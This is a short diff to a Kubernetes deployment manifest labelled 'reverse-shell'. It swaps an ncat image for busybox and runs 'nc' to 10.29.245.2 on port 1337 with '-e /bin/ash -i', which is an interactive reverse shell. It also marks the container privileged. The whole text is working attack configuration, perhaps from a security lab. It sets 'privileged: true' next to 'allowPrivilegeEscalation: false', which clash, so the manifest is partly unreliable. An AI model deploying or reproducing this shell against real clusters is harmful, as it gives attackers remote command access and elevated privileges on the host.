@@ -13,12 +13,15 @@ spec:
         app: reverse-shell
     spec:
       containers:
-      - name: ncat-reverse-shell
-        image: raesene/ncat:latest
+      - name: busybox
+        image: busybox:v1.34
         imagePullPolicy: Always
         securityContext:
           allowPrivilegeEscalation: false
-        args: ['10.29.245.2', '1337', '-e', '/bin/bash']
+          privileged: true
+        stdin: true
+        tty: true
+        command: ['/bin/nc', '10.29.245.2', '1337', '-e', '/bin/ash', '-i']
         resources:
           requests:
             memory: "64Mi"
